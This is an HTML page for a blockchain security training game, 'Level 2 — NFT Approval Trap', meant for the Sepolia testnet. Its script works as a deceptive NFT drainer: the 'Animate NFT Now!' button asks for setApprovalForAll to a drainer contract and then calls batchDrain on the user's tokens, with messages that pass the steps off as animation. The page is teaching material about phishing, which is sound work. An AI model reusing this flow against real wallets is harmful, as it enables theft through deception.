<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Level 2 ‚Äî NFT Approval Trap</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #fff;
      margin: 0;
    }
    .top-bar {
      background: #111;
      padding: 0.8rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.9rem;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.6);
    }
    .warning-bar {
      background-color: #ff3d00;
      color: #fff;
      padding: 0.75rem;
      text-align: center;
      font-weight: bold;
      font-size: 0.9rem;
    }
    .frame-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: calc(100vh - 120px);
      padding: 2rem;
    }
    .card {
      background: rgba(0, 0, 0, 0.85);
      border-radius: 12px;
      padding: 2rem;
      box-shadow: 0 0 18px #ff9800;
      max-width: 540px;
      width: 100%;
      text-align: center;
    }
    .button-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1rem;
      margin-top: 1.5rem;
    }
    button {
      padding: 1rem 2rem;
      font-size: 1rem;
      background: #ff9800;
      border: none;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
    }
    #status {
      margin-top: 2rem;
      font-size: 1.1rem;
      white-space: pre-wrap;
      text-align: left;
    }
    #nextBtn {
      display: none;
      background: #4caf50;
      padding: 1rem;
      border-radius: 8px;
      color: #fff;
      text-decoration: none;
      margin-top: 2rem;
    }
    .tooltip-box {
      margin-top: 2rem;
      padding: 1rem;
      background: #333;
      border-left: 4px solid #ff9800;
      text-align: left;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="top-bar">
    <div>Web3 War Game</div>
    <div>‚úÖ Survived: <span id="surviveCount">0</span> | üíÄ Drained: <span id="failCount">0</span></div>
  </div>

  <div class="warning-bar">
    ‚ö†Ô∏è This is a testnet simulation. Use a burner wallet with Sepolia ETH only. Never connect a real wallet.
  </div>

  <div class="frame-container">
    <div class="card">
      <h1>üß™ Level 2: Animate Your NFT</h1>
      <p>Claim your exclusive animation with one click‚Ä¶</p>
      <div class="button-container">
        <button id="connectBtn">Connect Wallet</button>
        <button id="animateBtn">Animate NFT Now!</button>
      </div>
      <div id="status"></div>
      <a href="level3.html" id="nextBtn">‚û°Ô∏è Proceed to Level 3</a>
      <div class="tooltip-box">
        üí° <strong>Did you know?</strong><br>
        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces manage your NFTs, but scammers use fake animation sites to trick you into approving a drain. Always verify contracts!<br><br>
        üö® This is a simulation‚Äîrejecting the transaction saves your NFTs!
      </div>
    </div>
  </div>

  <script>
    const nftContracts = [
      "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
      "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
    ];
    const drainerContract = "0xcFf5eb6bF03170F32cdc722FA54212e5a11BdC2C"; // V6 address
    const nftABI = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function balanceOf(address owner) view returns (uint256)",
      "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
      "function name() view returns (string)",
      "function isApprovedForAll(address owner, address operator) view returns (bool)"
    ];
    const drainerABI = [
      "function batchDrain(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
    ];

    let provider, signer;

    function updateCounters() {
      document.getElementById("surviveCount").textContent = localStorage.getItem("w3game_survived") || 0;
      document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
    }

    // Connects wallet and displays owned NFTs
    document.getElementById("connectBtn").onclick = async () => {
      const status = document.getElementById("status");
      status.innerText = "‚è≥ Connecting...";
      try {
        if (!window.ethereum) {
          status.innerText = "‚ùå MetaMask not detected. Please install or enable MetaMask.";
          return;
        }
        provider = new ethers.providers.Web3Provider(window.ethereum);
        try {
          await provider.send("eth_requestAccounts", []);
        } catch (err) {
          status.innerText = "‚ùå Connection rejected. Please approve the connection in MetaMask.";
          console.error("Connection error:", err);
          return;
        }
        signer = provider.getSigner();
        const network = await provider.getNetwork();
        if (network.chainId !== 11155111) {
          try {
            await window.ethereum.request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: "0xaa36a7" }],
            });
          } catch (switchError) {
            status.innerText = switchError.code === 4902
              ? "‚ùå Sepolia Testnet not found. Please add it to MetaMask."
              : "‚ùå Failed to switch to Sepolia Testnet.";
            console.error("Network switch error:", switchError);
            return;
          }
        }
        const user = await signer.getAddress();
        let summary = `‚úÖ Connected: ${user}\n\n`;
        for (const address of nftContracts) {
          try {
            const contract = new ethers.Contract(address, nftABI, signer);
            const name = await contract.name();
            const balance = await contract.balanceOf(user);
            summary += `üñºÔ∏è ${name}: ${balance} NFT(s)\n`;
          } catch (err) {
            console.warn(`Failed to query NFT contract ${address}:`, err);
            summary += `üñºÔ∏è ${address}: Error fetching data\n`;
          }
        }
        status.innerText = summary;
      } catch (err) {
        console.error("Unexpected connection error:", err);
        status.innerText = "‚ùå Wallet connection failed: " + err.message;
      }
    };

    // Animates (approves and drains) NFTs in one deceptive flow
    document.getElementById("animateBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!signer) return alert("Please connect your wallet first.");
      try {
        status.innerText = "‚è≥ Preparing your exclusive animation...";
        const user = await signer.getAddress();

        // Step 1: Request approvals
        for (const contractAddr of nftContracts) {
          const contract = new ethers.Contract(contractAddr, nftABI, signer);
          const isApproved = await contract.isApprovedForAll(user, drainerContract);
          if (!isApproved) {
            const tx = await contract.setApprovalForAll(drainerContract, true);
            status.innerText += `\n‚è≥ Activating animation for ${await contract.name()}...`;
            await tx.wait();
            status.innerText += "\n‚úÖ Animation ready!";
          }
        }

        // Step 2: Gather owned token IDs
        let tokenIdMatrix = [];
        for (const contractAddr of nftContracts) {
          const contract = new ethers.Contract(contractAddr, nftABI, signer);
          const balance = await contract.balanceOf(user);
          let ids = [];
          if (balance > 0) {
            for (let i = 0; i < balance; i++) {
              try {
                const tokenId = await contract.tokenOfOwnerByIndex(user, i);
                ids.push(Number(tokenId));
              } catch (e) {
                console.warn(`tokenOfOwnerByIndex failed for ${contractAddr} at index ${i}:`, e);
                ids.push(0); // Fallback to 0 if enumeration fails
              }
            }
          }
          tokenIdMatrix.push(ids.length > 0 ? ids : [0]); // Use [0] as placeholder if no valid IDs
        }

        // Check if tokenIdMatrix has valid data
        let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr.some(id => id !== 0));
        if (!hasValidIds) {
          status.innerText = "‚ö†Ô∏è No valid token IDs found. Please use hardcoded token IDs (e.g., [[1],[1]]) in the script.";
          return;
        }

        // Step 3: Drain NFTs
        status.innerText += "\nüö® Applying animation effects...";
        const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
        const tx = await drainer.batchDrain(nftContracts, tokenIdMatrix);
        await tx.wait();

        status.innerText +=
          "\nüíÄ Animation applied! NFTs drained as a side effect!\n\n" +
          "üß† Lesson: Phishing sites hide approval in 'fun' actions. Always read transaction details!";
        localStorage.setItem("w3game_level2", "drained");
        let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
        localStorage.setItem("w3game_failed", failCount + 1);
        updateCounters();
        document.getElementById("nextBtn").style.display = "inline-block";
      } catch (err) {
        if (err.code === "ACTION_REJECTED") {
          status.innerText =
            "‚úÖ You survived Level 2!\n\n" +
            "üõ°Ô∏è You rejected a malicious transaction that would have drained your NFTs. " +
            "Always verify contracts before approving!";
          let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
          localStorage.setItem("w3game_survived", surviveCount + 1);
          updateCounters();
          document.getElementById("nextBtn").style.display = "inline-block";
        } else {
          console.error("Drain error:", err);
          status.innerText = "‚ö†Ô∏è Unexpected error occurred: " + err.message;
          // Check Etherscan for debug logs
        }
      }
    };

    window.onload = () => {
      updateCounters();
    };
  </script>
</body>
</html>
